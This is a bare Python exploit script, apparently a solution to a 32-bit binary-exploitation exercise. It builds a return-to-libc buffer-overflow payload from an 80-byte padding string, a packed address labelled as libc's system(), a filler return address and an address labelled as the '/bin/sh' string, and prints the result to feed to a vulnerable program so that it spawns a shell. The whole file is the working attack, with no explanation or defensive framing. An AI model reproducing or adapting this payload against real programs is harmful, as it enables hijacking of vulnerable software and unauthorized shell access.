import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT"
libc_system = struct.pack("I", 0xb7ecffb0)
return_addr_after_system = "AAAA"
bin_sh_addr = struct.pack("I", 0xb7fb63bf)

print (padding + libc_system + return_addr_after_system + bin_sh_addr)
